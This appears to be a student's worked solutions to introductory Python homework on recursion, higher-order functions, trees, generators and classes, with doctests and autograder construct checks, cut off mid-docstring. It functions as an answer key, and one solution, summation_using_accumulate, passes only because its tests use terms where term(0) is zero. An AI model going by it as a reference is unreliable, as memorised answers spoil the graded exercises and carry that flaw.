    &gt;&gt;&gt; two_of_three(5, 5, 5)&#13;
    50&#13;
    '''&#13;
    return i ** 2 + j ** 2 + k ** 2 - max(i, j, k) ** 2&#13;
&#13;
&#13;
&#13;
def largest_factor(n):&#13;
    '''Return the largest factor of n that is smaller than n.&#13;
&#13;
    &gt;&gt;&gt; largest_factor(15) # factors are 1, 3, 5&#13;
    5&#13;
    &gt;&gt;&gt; largest_factor(80) # factors are 1, 2, 4, 5, 8, 10, 16, 20, 40&#13;
    40&#13;
    &gt;&gt;&gt; largest_factor(13) # factor is 1 since 13 is prime&#13;
    1&#13;
    '''&#13;
    i = n - 1&#13;
    while i &gt;= 1:&#13;
        if n % i == 0: &#13;
            return i&#13;
        i = i -1    &#13;
&#13;
&#13;
&#13;
def hailstone(n):&#13;
    '''Print the hailstone sequence starting at n and return its&#13;
    length.&#13;
&#13;
    &gt;&gt;&gt; a = hailstone(10)&#13;
    10&#13;
    5&#13;
    16&#13;
    8&#13;
    4&#13;
    2&#13;
    1&#13;
    &gt;&gt;&gt; a&#13;
    7&#13;
    &gt;&gt;&gt; b = hailstone(1)&#13;
    1&#13;
    &gt;&gt;&gt; b&#13;
    1&#13;
    '''&#13;
    length = 1&#13;
    while n != 1:&#13;
        print(n)&#13;
        if n % 2 == 0:&#13;
            n = n //2&#13;
        else:&#13;
            n = 3 * n + 1&#13;
        length = length + 1&#13;
    print(n)&#13;
    return length&#13;
```&#13;
&#13;
## hw02&#13;
&#13;
```python&#13;
from operator import add, mul, sub&#13;
&#13;
square = lambda x: x * x&#13;
&#13;
identity = lambda x: x&#13;
&#13;
triple = lambda x: 3 * x&#13;
&#13;
increment = lambda x: x + 1&#13;
&#13;
&#13;
HW_SOURCE_FILE=__file__&#13;
&#13;
&#13;
def product(n, term):&#13;
    '''Return the product of the first n terms in a sequence.&#13;
&#13;
    n: a positive integer&#13;
    term:  a function that takes one argument to produce the term&#13;
&#13;
    &gt;&gt;&gt; product(3, identity)  # 1 * 2 * 3&#13;
    6&#13;
    &gt;&gt;&gt; product(5, identity)  # 1 * 2 * 3 * 4 * 5&#13;
    120&#13;
    &gt;&gt;&gt; product(3, square)    # 1^2 * 2^2 * 3^2&#13;
    36&#13;
    &gt;&gt;&gt; product(5, square)    # 1^2 * 2^2 * 3^2 * 4^2 * 5^2&#13;
    14400&#13;
    &gt;&gt;&gt; product(3, increment) # (1+1) * (2+1) * (3+1)&#13;
    24&#13;
    &gt;&gt;&gt; product(3, triple)    # 1*3 * 2*3 * 3*3&#13;
    162&#13;
    '''&#13;
    i, product_result = 1, 1&#13;
    while i &lt;= n:&#13;
        product_result, i = product_result * term(i), i + 1&#13;
    return product_result&#13;
&#13;
&#13;
def accumulate(fuse, start, n, term):&#13;
    '''Return the result of fusing together the first n terms in a sequence &#13;
    and start.  The terms to be fused are term(1), term(2), ..., term(n). &#13;
    The function fuse is a two-argument commutative &amp; associative function.&#13;
&#13;
    &gt;&gt;&gt; accumulate(add, 0, 5, identity)  # 0 + 1 + 2 + 3 + 4 + 5&#13;
    15&#13;
    &gt;&gt;&gt; accumulate(add, 11, 5, identity) # 11 + 1 + 2 + 3 + 4 + 5&#13;
    26&#13;
    &gt;&gt;&gt; accumulate(add, 11, 0, identity) # 11 (fuse is never used)&#13;
    11&#13;
    &gt;&gt;&gt; accumulate(add, 11, 3, square)   # 11 + 1^2 + 2^2 + 3^2&#13;
    25&#13;
    &gt;&gt;&gt; accumulate(mul, 2, 3, square)    # 2 * 1^2 * 2^2 * 3^2&#13;
    72&#13;
    &gt;&gt;&gt; # 2 + (1^2 + 1) + (2^2 + 1) + (3^2 + 1)&#13;
    &gt;&gt;&gt; accumulate(lambda x, y: x + y + 1, 2, 3, square)&#13;
    19&#13;
    '''&#13;
    i = 1&#13;
    product_result = start&#13;
    while i &lt;= n:&#13;
        product_result = fuse(product_result, term(i))&#13;
        i = i + 1&#13;
    return product_result&#13;
&#13;
&#13;
def summation_using_accumulate(n, term):&#13;
    '''Returns the sum: term(1) + ... + term(n), using accumulate.&#13;
&#13;
    &gt;&gt;&gt; summation_using_accumulate(5, square) # square(0) + square(1) + ... + square(4) + square(5)&#13;
    55&#13;
    &gt;&gt;&gt; summation_using_accumulate(5, triple) # triple(0) + triple(1) + ... + triple(4) + triple(5)&#13;
    45&#13;
    &gt;&gt;&gt; # This test checks that the body of the function is just a return statement.&#13;
    &gt;&gt;&gt; import inspect, ast&#13;
    &gt;&gt;&gt; [type(x).__name__ for x in ast.parse(inspect.getsource(summation_using_accumulate)).body[0].body]&#13;
    ['Expr', 'Return']&#13;
    '''&#13;
    return accumulate(add, term(0), n, term)&#13;
&#13;
&#13;
def product_using_accumulate(n, term):&#13;
    '''Returns the product: term(1) * ... * term(n), using accumulate.&#13;
&#13;
    &gt;&gt;&gt; product_using_accumulate(4, square) # square(1) * square(2) * square(3) * square()&#13;
    576&#13;
    &gt;&gt;&gt; product_using_accumulate(6, triple) # triple(1) * triple(2) * ... * triple(5) * triple(6)&#13;
    524880&#13;
    &gt;&gt;&gt; # This test checks that the body of the function is just a return statement.&#13;
    &gt;&gt;&gt; import inspect, ast&#13;
    &gt;&gt;&gt; [type(x).__name__ for x in ast.parse(inspect.getsource(product_using_accumulate)).body[0].body]&#13;
    ['Expr', 'Return']&#13;
    '''&#13;
    return accumulate(mul,1,n,term)&#13;
&#13;
&#13;
def make_repeater(f, n):&#13;
    '''Returns the function that computes the nth application of f.&#13;
&#13;
    &gt;&gt;&gt; add_three = make_repeater(increment, 3)&#13;
    &gt;&gt;&gt; add_three(5)&#13;
    8&#13;
    &gt;&gt;&gt; make_repeater(triple, 5)(1) # 3 * (3 * (3 * (3 * (3 * 1))))&#13;
    243&#13;
    &gt;&gt;&gt; make_repeater(square, 2)(5) # square(square(5))&#13;
    625&#13;
    &gt;&gt;&gt; make_repeater(square, 3)(5) # square(square(square(5)))&#13;
    390625&#13;
    '''&#13;
    def repeater(x):&#13;
            k = 0&#13;
            while k &lt; n:&#13;
                x, k = f(x), k + 1&#13;
            return x&#13;
    return repeater &#13;
&#13;
&#13;
def digit_distance(n):&#13;
    '''Determines the digit distance of n.&#13;
&#13;
    &gt;&gt;&gt; digit_distance(3)&#13;
    0&#13;
    &gt;&gt;&gt; digit_distance(777)&#13;
    0&#13;
    &gt;&gt;&gt; digit_distance(314)&#13;
    5&#13;
    &gt;&gt;&gt; digit_distance(31415926535)&#13;
    32&#13;
    &gt;&gt;&gt; digit_distance(3464660003)&#13;
    16&#13;
    &gt;&gt;&gt; from construct_check import check&#13;
    &gt;&gt;&gt; # ban all loops&#13;
    &gt;&gt;&gt; check(HW_SOURCE_FILE, 'digit_distance',&#13;
    ...       ['For', 'While'])&#13;
    True&#13;
    '''&#13;
    if n &lt; 10:&#13;
        return 0&#13;
    else:&#13;
        return abs(sub(n % 10, n // 10 % 10)) + digit_distance(n // 10)&#13;
&#13;
&#13;
def interleaved_sum(n, odd_func, even_func):&#13;
    '''Compute the sum odd_func(1) + even_func(2) + odd_func(3) + ..., up&#13;
    to n.&#13;
&#13;
    &gt;&gt;&gt; identity = lambda x: x&#13;
    &gt;&gt;&gt; square = lambda x: x * x&#13;
    &gt;&gt;&gt; triple = lambda x: x * 3&#13;
    &gt;&gt;&gt; interleaved_sum(5, identity, square) # 1   + 2*2 + 3   + 4*4 + 5&#13;
    29&#13;
    &gt;&gt;&gt; interleaved_sum(5, square, identity) # 1*1 + 2   + 3*3 + 4   + 5*5&#13;
    41&#13;
    &gt;&gt;&gt; interleaved_sum(4, triple, square)   # 1*3 + 2*2 + 3*3 + 4*4&#13;
    32&#13;
    &gt;&gt;&gt; interleaved_sum(4, square, triple)   # 1*1 + 2*3 + 3*3 + 4*3&#13;
    28&#13;
    &gt;&gt;&gt; from construct_check import check&#13;
    &gt;&gt;&gt; check(HW_SOURCE_FILE, 'interleaved_sum', ['While', 'For', 'Mod']) # ban loops and %&#13;
    True&#13;
    &gt;&gt;&gt; check(HW_SOURCE_FILE, 'interleaved_sum', ['BitAnd', 'BitOr', 'BitXor']) # ban bitwise operators, don't worry about these if you don't know what they are&#13;
    True&#13;
    '''&#13;
&#13;
    if n == 0:&#13;
        return 0&#13;
    elif n % 2 == 1:&#13;
        return odd_func(n) + interleaved_sum(n - 1, odd_func, even_func)&#13;
    else:&#13;
        return even_func(n) + interleaved_sum(n - 1, odd_func, even_func)&#13;
&#13;
&#13;
def next_larger_coin(coin):&#13;
    '''Returns the next larger coin in order.&#13;
    &gt;&gt;&gt; next_larger_coin(1)&#13;
    5&#13;
    &gt;&gt;&gt; next_larger_coin(5)&#13;
    10&#13;
    &gt;&gt;&gt; next_larger_coin(10)&#13;
    25&#13;
    &gt;&gt;&gt; next_larger_coin(2) # Other values return None&#13;
    '''&#13;
    if coin == 1:&#13;
        return 5&#13;
    elif coin == 5:&#13;
        return 10&#13;
    elif coin == 10:&#13;
        return 25&#13;
&#13;
def next_smaller_coin(coin):&#13;
    '''Returns the next smaller coin in order.&#13;
    &gt;&gt;&gt; next_smaller_coin(25)&#13;
    10&#13;
    &gt;&gt;&gt; next_smaller_coin(10)&#13;
    5&#13;
    &gt;&gt;&gt; next_smaller_coin(5)&#13;
    1&#13;
    &gt;&gt;&gt; next_smaller_coin(2) # Other values return None&#13;
    '''&#13;
    if coin == 25:&#13;
        return 10&#13;
    elif coin == 10:&#13;
        return 5&#13;
    elif coin == 5:&#13;
        return 1&#13;
&#13;
def count_coins(total):&#13;
    '''Return the number of ways to make change using coins of value of 1, 5, 10, 25.&#13;
    &gt;&gt;&gt; count_coins(15)&#13;
    6&#13;
    &gt;&gt;&gt; count_coins(10)&#13;
    4&#13;
    &gt;&gt;&gt; count_coins(20)&#13;
    9&#13;
    &gt;&gt;&gt; count_coins(100) # How many ways to make change for a dollar?&#13;
    242&#13;
    &gt;&gt;&gt; count_coins(200)&#13;
    1463&#13;
    &gt;&gt;&gt; from construct_check import check&#13;
    &gt;&gt;&gt; # ban iteration&#13;
    &gt;&gt;&gt; check(HW_SOURCE_FILE, 'count_coins', ['While', 'For'])&#13;
    True&#13;
    '''&#13;
                                        &#13;
    def helper(total, coin):&#13;
        if total == 0:&#13;
            return 1&#13;
        if total &lt; 0 or not coin :&#13;
            return 0&#13;
        return helper(total - coin,coin) + helper(total, next_smaller_coin(coin))&#13;
    return helper(total, 25)&#13;
```&#13;
&#13;
## hw03&#13;
&#13;
&#13;
&#13;
```python&#13;
&#13;
HW_SOURCE_FILE=__file__&#13;
&#13;
&#13;
def pascal(row, column):&#13;
    '''Returns the value of the item in Pascal's Triangle&#13;
    whose position is specified by row and column.&#13;
    &gt;&gt;&gt; pascal(0, 0)    # The top left (the point of the triangle)&#13;
    1&#13;
    &gt;&gt;&gt; pascal(0, 5)	# Empty entry; outside of Pascal's Triangle&#13;
    0&#13;
    &gt;&gt;&gt; pascal(3, 2)	# Row 3 (1 3 3 1), Column 2&#13;
    3&#13;
    &gt;&gt;&gt; pascal(4, 2)     # Row 4 (1 4 6 4 1), Column 2&#13;
    6&#13;
    '''&#13;
    if column == 0:&#13;
        return 1&#13;
    elif row == 0:&#13;
        return 0&#13;
    else:&#13;
        return pascal(row - 1, column) + pascal(row - 1, column - 1)&#13;
&#13;
def insert_items(s, before, after):&#13;
    '''Insert after into s after each occurrence of before and then return s.&#13;
&#13;
    &gt;&gt;&gt; test_s = [1, 5, 8, 5, 2, 3]&#13;
    &gt;&gt;&gt; new_s = insert_items(test_s, 5, 7)&#13;
    &gt;&gt;&gt; new_s&#13;
    [1, 5, 7, 8, 5, 7, 2, 3]&#13;
    &gt;&gt;&gt; test_s&#13;
    [1, 5, 7, 8, 5, 7, 2, 3]&#13;
    &gt;&gt;&gt; new_s is test_s&#13;
    True&#13;
    &gt;&gt;&gt; double_s = [1, 2, 1, 2, 3, 3]&#13;
    &gt;&gt;&gt; double_s = insert_items(double_s, 3, 4)&#13;
    &gt;&gt;&gt; double_s&#13;
    [1, 2, 1, 2, 3, 4, 3, 4]&#13;
    &gt;&gt;&gt; large_s = [1, 4, 8]&#13;
    &gt;&gt;&gt; large_s2 = insert_items(large_s, 4, 4)&#13;
    &gt;&gt;&gt; large_s2&#13;
    [1, 4, 4, 8]&#13;
    &gt;&gt;&gt; large_s3 = insert_items(large_s2, 4, 6)&#13;
    &gt;&gt;&gt; large_s3&#13;
    [1, 4, 6, 4, 6, 8]&#13;
    &gt;&gt;&gt; large_s3 is large_s&#13;
    True&#13;
    '''&#13;
    i = 0&#13;
    while i &lt; len(s):&#13;
        if s[i] == before:&#13;
            s.insert(i + 1, after)&#13;
            i += 1&#13;
        i += 1&#13;
    return s&#13;
&#13;
&#13;
HW_SOURCE_FILE=__file__&#13;
&#13;
&#13;
def planet(mass):&#13;
    '''Construct a planet of some mass.'''&#13;
    assert mass &gt; 0&#13;
&#13;
    return ['planet', mass]&#13;
def mass(p):&#13;
    '''Select the mass of a planet.'''&#13;
    assert is_planet(p), 'must call mass on a planet'&#13;
    return p[1]&#13;
&#13;
&#13;
def is_planet(p):&#13;
    '''Whether p is a planet.'''&#13;
    return type(p) == list and len(p) == 2 and p[0] == 'planet'&#13;
&#13;
def examples():&#13;
    t = mobile(arm(1, planet(2)),&#13;
               arm(2, planet(1)))&#13;
    u = mobile(arm(5, planet(1)),&#13;
               arm(1, mobile(arm(2, planet(3)),&#13;
                             arm(3, planet(2)))))&#13;
    v = mobile(arm(4, t), arm(2, u))&#13;
    return t, u, v&#13;
&#13;
def total_mass(m):&#13;
    '''Return the total mass of m, a planet or mobile.&#13;
&#13;
    &gt;&gt;&gt; t, u, v = examples()&#13;
    &gt;&gt;&gt; total_mass(t)&#13;
    3&#13;
    &gt;&gt;&gt; total_mass(u)&#13;
    6&#13;
    &gt;&gt;&gt; total_mass(v)&#13;
    9&#13;
    '''&#13;
    if is_planet(m):&#13;
        return mass(m)&#13;
    else:&#13;
        assert is_mobile(m), 'must get total mass of a mobile or a planet'&#13;
        return total_mass(end(left(m))) + total_mass(end(right(m)))&#13;
&#13;
def balanced(m):&#13;
    '''Return whether m is balanced.&#13;
&#13;
    &gt;&gt;&gt; t, u, v = examples()&#13;
    &gt;&gt;&gt; balanced(t)&#13;
    True&#13;
    &gt;&gt;&gt; balanced(v)&#13;
    True&#13;
    &gt;&gt;&gt; p = mobile(arm(3, t), arm(2, u))&#13;
    &gt;&gt;&gt; balanced(p)&#13;
    False&#13;
    &gt;&gt;&gt; balanced(mobile(arm(1, v), arm(1, p)))&#13;
    False&#13;
    &gt;&gt;&gt; balanced(mobile(arm(1, p), arm(1, v)))&#13;
    False&#13;
    &gt;&gt;&gt; from construct_check import check&#13;
    &gt;&gt;&gt; # checking for abstraction barrier violations by banning indexing&#13;
    &gt;&gt;&gt; check(HW_SOURCE_FILE, 'balanced', ['Index'])&#13;
    True&#13;
    '''&#13;
    if is_planet(m):&#13;
        return True&#13;
    else:&#13;
        left_end, right_end = end(left(m)), end(right(m))&#13;
        torque_left = length(left(m)) * total_mass(left_end)&#13;
        torque_right = length(right(m)) * total_mass(right_end)&#13;
        return torque_left == torque_right and balanced(left_end) and balanced(right_end)&#13;
&#13;
def berry_finder(t):&#13;
    '''Returns True if t contains a node with the value 'berry' and &#13;
    False otherwise.&#13;
&#13;
    &gt;&gt;&gt; scrat = tree('berry')&#13;
    &gt;&gt;&gt; berry_finder(scrat)&#13;
    True&#13;
    &gt;&gt;&gt; sproul = tree('roots', [tree('branch1', [tree('leaf'), tree('berry')]), tree('branch2')])&#13;
    &gt;&gt;&gt; berry_finder(sproul)&#13;
    True&#13;
    &gt;&gt;&gt; numbers = tree(1, [tree(2), tree(3, [tree(4), tree(5)]), tree(6, [tree(7)])])&#13;
    &gt;&gt;&gt; berry_finder(numbers)&#13;
    False&#13;
    &gt;&gt;&gt; t = tree(1, [tree('berry',[tree('not berry')])])&#13;
    &gt;&gt;&gt; berry_finder(t)&#13;
    True&#13;
    '''&#13;
    if label(t) == 'berry':&#13;
        return True&#13;
    &#13;
    return len([x for x in branches(t) if berry_finder(x) == True]) &gt; 0&#13;
&#13;
&#13;
HW_SOURCE_FILE=__file__&#13;
&#13;
&#13;
def max_path_sum(t):&#13;
    '''Return the maximum root-to-leaf path sum of a tree.&#13;
    &gt;&gt;&gt; t = tree(1, [tree(5, [tree(1), tree(3)]), tree(10)])&#13;
    &gt;&gt;&gt; max_path_sum(t) # 1, 10&#13;
    11&#13;
    &gt;&gt;&gt; t2 = tree(5, [tree(4, [tree(1), tree(3)]), tree(2, [tree(10), tree(3)])])&#13;
    &gt;&gt;&gt; max_path_sum(t2) # 5, 2, 10&#13;
    17&#13;
    '''&#13;
    if is_leaf(t):&#13;
        return label(t)&#13;
    &#13;
    return max([max_path_sum(i) for i in branches(t)]) + label(t)&#13;
&#13;
&#13;
def print_move(origin, destination):&#13;
    '''Print instructions to move a disk.'''&#13;
    print('Move the top disk from rod', origin, 'to rod', destination)&#13;
&#13;
def move_stack(n, start, end):&#13;
    '''Print the moves required to move n disks on the start pole to the end&#13;
    pole without violating the rules of Towers of Hanoi.&#13;
&#13;
    n -- number of disks&#13;
    start -- a pole position, either 1, 2, or 3&#13;
    end -- a pole position, either 1, 2, or 3&#13;
&#13;
    There are exactly three poles, and start and end must be different. Assume&#13;
    that the start pole has at least n disks of increasing size, and the end&#13;
    pole is either empty or has a top disk larger than the top n start disks.&#13;
&#13;
    &gt;&gt;&gt; move_stack(1, 1, 3)&#13;
    Move the top disk from rod 1 to rod 3&#13;
    &gt;&gt;&gt; move_stack(2, 1, 3)&#13;
    Move the top disk from rod 1 to rod 2&#13;
    Move the top disk from rod 1 to rod 3&#13;
    Move the top disk from rod 2 to rod 3&#13;
    &gt;&gt;&gt; move_stack(3, 1, 3)&#13;
    Move the top disk from rod 1 to rod 3&#13;
    Move the top disk from rod 1 to rod 2&#13;
    Move the top disk from rod 3 to rod 2&#13;
    Move the top disk from rod 1 to rod 3&#13;
    Move the top disk from rod 2 to rod 1&#13;
    Move the top disk from rod 2 to rod 3&#13;
    Move the top disk from rod 1 to rod 3&#13;
    '''&#13;
    assert 1 &lt;= start &lt;= 3 and 1 &lt;= end &lt;= 3 and start != end, 'Bad start/end'&#13;
    if n == 1:&#13;
        print_move(start, end)&#13;
    else: &#13;
        move_stack(n - 1, start, 6 - start - end)&#13;
        move_stack(1, start, end)&#13;
        move_stack(n - 1, 6 - start - end, end)&#13;
&#13;
from operator import sub, mul&#13;
&#13;
def make_anonymous_factorial():&#13;
    '''Return the value of an expression that computes factorial.&#13;
&#13;
    &gt;&gt;&gt; make_anonymous_factorial()(5)&#13;
    120&#13;
    &gt;&gt;&gt; from construct_check import check&#13;
    &gt;&gt;&gt; # ban any assignments or recursion&#13;
    &gt;&gt;&gt; check(HW_SOURCE_FILE, 'make_anonymous_factorial',&#13;
    ...     ['Assign', 'AnnAssign', 'AugAssign', 'NamedExpr', 'FunctionDef', 'Recursion'])&#13;
    True&#13;
    '''&#13;
    return (lambda f: lambda k: f(f, k))(lambda f, k: k if k == 1 else mul(k, f(f, sub(k, 1))))&#13;
&#13;
&#13;
def mobile(left, right):&#13;
    '''Construct a mobile from a left arm and a right arm.'''&#13;
    assert is_arm(left), 'left must be an arm'&#13;
    assert is_arm(right), 'right must be an arm'&#13;
    return ['mobile', left, right]&#13;
&#13;
def is_mobile(m):&#13;
    '''Return whether m is a mobile.'''&#13;
    return type(m) == list and len(m) == 3 and m[0] == 'mobile'&#13;
&#13;
def left(m):&#13;
    '''Select the left arm of a mobile.'''&#13;
    assert is_mobile(m), 'must call left on a mobile'&#13;
    return m[1]&#13;
&#13;
def right(m):&#13;
    '''Select the right arm of a mobile.'''&#13;
    assert is_mobile(m), 'must call right on a mobile'&#13;
    return m[2]&#13;
&#13;
def arm(length, mobile_or_planet):&#13;
    '''Construct an arm: a length of rod with a mobile or planet at the end.'''&#13;
    assert is_mobile(mobile_or_planet) or is_planet(mobile_or_planet)&#13;
    return ['arm', length, mobile_or_planet]&#13;
&#13;
def is_arm(s):&#13;
    '''Return whether s is an arm.'''&#13;
    return type(s) == list and len(s) == 3 and s[0] == 'arm'&#13;
&#13;
def length(s):&#13;
    '''Select the length of an arm.'''&#13;
    assert is_arm(s), 'must call length on an arm'&#13;
    return s[1]&#13;
&#13;
def end(s):&#13;
    '''Select the mobile or planet hanging at the end of an arm.'''&#13;
    assert is_arm(s), 'must call end on an arm'&#13;
    return s[2]&#13;
&#13;
&#13;
&#13;
# Tree Data Abstraction&#13;
&#13;
def tree(label, branches=[]):&#13;
    '''Construct a tree with the given label value and a list of branches.'''&#13;
    for branch in branches:&#13;
        assert is_tree(branch), 'branches must be trees'&#13;
    return [label] + list(branches)&#13;
&#13;
def label(tree):&#13;
    '''Return the label value of a tree.'''&#13;
    return tree[0]&#13;
&#13;
def branches(tree):&#13;
    '''Return the list of branches of the given tree.'''&#13;
    return tree[1:]&#13;
&#13;
def is_tree(tree):&#13;
    '''Returns True if the given tree is a tree, and False otherwise.'''&#13;
    if type(tree) != list or len(tree) &lt; 1:&#13;
        return False&#13;
    for branch in branches(tree):&#13;
        if not is_tree(branch):&#13;
            return False&#13;
    return True&#13;
&#13;
def is_leaf(tree):&#13;
    '''Returns True if the given tree's list of branches is empty, and False&#13;
    otherwise.&#13;
    '''&#13;
    return not branches(tree)&#13;
&#13;
def print_tree(t, indent=0):&#13;
    '''Print a representation of this tree in which each node is&#13;
    indented by two spaces times its depth from the root.&#13;
&#13;
    &gt;&gt;&gt; print_tree(tree(1))&#13;
    1&#13;
    &gt;&gt;&gt; print_tree(tree(1, [tree(2)]))&#13;
    1&#13;
      2&#13;
    &gt;&gt;&gt; numbers = tree(1, [tree(2), tree(3, [tree(4), tree(5)]), tree(6, [tree(7)])])&#13;
    &gt;&gt;&gt; print_tree(numbers)&#13;
    1&#13;
      2&#13;
      3&#13;
        4&#13;
        5&#13;
      6&#13;
        7&#13;
    '''&#13;
    print('  ' * indent + str(label(t)))&#13;
    for b in branches(t):&#13;
        print_tree(b, indent + 1)&#13;
&#13;
def copy_tree(t):&#13;
    '''Returns a copy of t. Only for testing purposes.&#13;
&#13;
    &gt;&gt;&gt; t = tree(5)&#13;
    &gt;&gt;&gt; copy = copy_tree(t)&#13;
    &gt;&gt;&gt; t = tree(6)&#13;
    &gt;&gt;&gt; print_tree(copy)&#13;
    5&#13;
    '''&#13;
    return tree(label(t), [copy_tree(b) for b in branches(t)])&#13;
&#13;
```&#13;
&#13;
&#13;
&#13;
## hw04&#13;
&#13;
&#13;
&#13;
```python&#13;
def hailstone(n):&#13;
    '''Q1: Yields the elements of the hailstone sequence starting at n.&#13;
       At the end of the sequence, yield 1 infinitely.&#13;
&#13;
    &gt;&gt;&gt; hail_gen = hailstone(10)&#13;
    &gt;&gt;&gt; [next(hail_gen) for _ in range(10)]&#13;
    [10, 5, 16, 8, 4, 2, 1, 1, 1, 1]&#13;
    &gt;&gt;&gt; next(hail_gen)&#13;
    1&#13;
    '''&#13;
    yield n&#13;
    if n == 1:&#13;
       yield from hailstone(1)&#13;
    elif n % 2 == 1: &#13;
        yield from hailstone(n * 3 + 1)&#13;
    else:&#13;
        yield from hailstone(n // 2)&#13;
&#13;
&#13;
def merge(a, b):&#13;
    '''Q2:&#13;
    &gt;&gt;&gt; def sequence(start, step):&#13;
    ...     while True:&#13;
    ...         yield start&#13;
    ...         start += step&#13;
    &gt;&gt;&gt; a = sequence(2, 3) # 2, 5, 8, 11, 14, ...&#13;
    &gt;&gt;&gt; b = sequence(3, 2) # 3, 5, 7, 9, 11, 13, 15, ...&#13;
    &gt;&gt;&gt; result = merge(a, b) # 2, 3, 5, 7, 8, 9, 11, 13, 14, 15&#13;
    &gt;&gt;&gt; [next(result) for _ in range(10)]&#13;
    [2, 3, 5, 7, 8, 9, 11, 13, 14, 15]&#13;
    '''&#13;
    first_a, first_b = next(a), next(b)&#13;
    while True:&#13;
        if first_a == first_b:&#13;
            yield first_a&#13;
            first_a, first_b = next(a), next(b)&#13;
        elif first_a &lt; first_b:&#13;
            yield first_a&#13;
            first_a = next(a)&#13;
        else:&#13;
            yield first_b&#13;
            first_b = next(b)&#13;
&#13;
def perms(seq):&#13;
    '''Q3: Generates all permutations of the given sequence. Each permutation is a&#13;
    list of the elements in SEQ in a different order. The permutations may be&#13;
    yielded in any order.&#13;
&#13;
    &gt;&gt;&gt; p = perms([100])&#13;
    &gt;&gt;&gt; type(p)&#13;
    &lt;class 'generator'&gt;&#13;
    &gt;&gt;&gt; next(p)&#13;
    [100]&#13;
    &gt;&gt;&gt; try: # Prints 'No more permutations!' if calling next would cause an error&#13;
    ...     next(p)&#13;
    ... except StopIteration:&#13;
    ...     print('No more permutations!')&#13;
    No more permutations!&#13;
    &gt;&gt;&gt; sorted(perms([1, 2, 3])) # Returns a sorted list containing elements of the generator&#13;
    [[1, 2, 3], [1, 3, 2], [2, 1, 3], [2, 3, 1], [3, 1, 2], [3, 2, 1]]&#13;
    &gt;&gt;&gt; sorted(perms((10, 20, 30)))&#13;
    [[10, 20, 30], [10, 30, 20], [20, 10, 30], [20, 30, 10], [30, 10, 20], [30, 20, 10]]&#13;
    &gt;&gt;&gt; sorted(perms('ab'))&#13;
    [['a', 'b'], ['b', 'a']]&#13;
    '''&#13;
    if len(seq) == 1:&#13;
        yield [seq[0]]&#13;
    else:&#13;
        for i in range(len(seq)):&#13;
            lst = list(perms(seq[:i] + seq[(i + 1):]))&#13;
            for it in lst:&#13;
                it.append(seq[i]) &#13;
                yield it&#13;
&#13;
&#13;
&#13;
&#13;
def yield_paths(t, value):&#13;
    '''Q4: Yields all possible paths from the root of t to a node with the label&#13;
    value as a list.&#13;
&#13;
    &gt;&gt;&gt; t1 = tree(1, [tree(2, [tree(3), tree(4, [tree(6)]), tree(5)]), tree(5)])&#13;
    &gt;&gt;&gt; print_tree(t1)&#13;
    1&#13;
      2&#13;
        3&#13;
        4&#13;
          6&#13;
        5&#13;
      5&#13;
    &gt;&gt;&gt; next(yield_paths(t1, 6))&#13;
    [1, 2, 4, 6]&#13;
    &gt;&gt;&gt; path_to_5 = yield_paths(t1, 5)&#13;
    &gt;&gt;&gt; sorted(list(path_to_5))&#13;
    [[1, 2, 5], [1, 5]]&#13;
&#13;
    &gt;&gt;&gt; t2 = tree(0, [tree(2, [t1])])&#13;
    &gt;&gt;&gt; print_tree(t2)&#13;
    0&#13;
      2&#13;
        1&#13;
          2&#13;
            3&#13;
            4&#13;
              6&#13;
            5&#13;
          5&#13;
    &gt;&gt;&gt; path_to_2 = yield_paths(t2, 2)&#13;
    &gt;&gt;&gt; sorted(list(path_to_2))&#13;
    [[0, 2], [0, 2, 1, 2]]&#13;
    '''&#13;
    if label(t) == value:&#13;
        yield [label(t)]&#13;
    for b in branches(t):&#13;
        for path in list(yield_paths(b, value)):&#13;
            yield [label(t)] + path&#13;
&#13;
&#13;
class Minty:&#13;
    '''A mint creates coins by stamping on years. The update method sets the mint's stamp to Minty.present_year.&#13;
    &gt;&gt;&gt; mint = Minty()&#13;
    &gt;&gt;&gt; mint.year&#13;
    2021&#13;
    &gt;&gt;&gt; dime = mint.create('Dime')&#13;
    &gt;&gt;&gt; dime.year&#13;
    2021&#13;
    &gt;&gt;&gt; Minty.present_year = 2101  # Time passes&#13;
    &gt;&gt;&gt; nickel = mint.create('Nickel')&#13;
    &gt;&gt;&gt; nickel.year     # The mint has not updated its stamp yet&#13;
    2021&#13;
    &gt;&gt;&gt; nickel.worth()  # 5 cents + (80 - 50 years)&#13;
    35&#13;
    &gt;&gt;&gt; mint.update()   # The mint's year is updated to 2101&#13;
    &gt;&gt;&gt; Minty.present_year = 2176     # More time passes&#13;
    &gt;&gt;&gt; mint.create('Dime').worth()    # 10 cents + (75 - 50 years)&#13;
    35&#13;
    &gt;&gt;&gt; Minty().create('Dime').worth()  # A new mint has the current year&#13;
    10&#13;
    &gt;&gt;&gt; dime.worth()     # 10 cents + (155 - 50 years)&#13;
    115&#13;
    '''&#13;
    present_year = 2021&#13;
&#13;
    def __init__(self):&#13;
        self.update()&#13;
&#13;
    def create(self, type):&#13;
        return Coin(self.year, type)&#13;
&#13;
    def update(self):&#13;
        self.year = Minty.present_year&#13;
&#13;
class Coin:&#13;
    cents = 50&#13;
&#13;
    def __init__(self, year, type):&#13;
        self.year = year&#13;
        if type == ('Dime'):&#13;
            self.cents = 10&#13;
        elif type == ('Nickel'):&#13;
            self.cents = 5&#13;
&#13;
    def worth(self):&#13;
        return self.cents + max(0, Minty.present_year - self.year - 50)&#13;
&#13;
&#13;
class VendingMachine:&#13;
    '''A vending machine that vends some product for some price.&#13;
&#13;
    &gt;&gt;&gt; v = VendingMachine('candy', 10)&#13;
    &gt;&gt;&gt; v.vend()&#13;
    'Nothing left to vend. Please restock.'&#13;
    &gt;&gt;&gt; v.add_funds(15)&#13;
    'Nothing left to vend. Please restock. Here is your $15.'&#13;
    &gt;&gt;&gt; v.restock(2)&#13;
    'Current candy stock: 2'&#13;
    &gt;&gt;&gt; v.vend()&#13;
    'Please add $10 more funds.'&#13;
    &gt;&gt;&gt; v.add_funds(7)&#13;
    'Current balance: $7'&#13;
    &gt;&gt;&gt; v.vend()&#13;
    'Please add $3 more funds.'&#13;
    &gt;&gt;&gt; v.add_funds(5)&#13;
    'Current balance: $12'&#13;
    &gt;&gt;&gt; v.vend()&#13;
    'Here is your candy and $2 change.'&#13;
    &gt;&gt;&gt; v.add_funds(10)&#13;
    'Current balance: $10'&#13;
    &gt;&gt;&gt; v.vend()&#13;
    'Here is your candy.'&#13;
    &gt;&gt;&gt; v.add_funds(15)&#13;
    'Nothing left to vend. Please restock. Here is your $15.'&#13;
&#13;
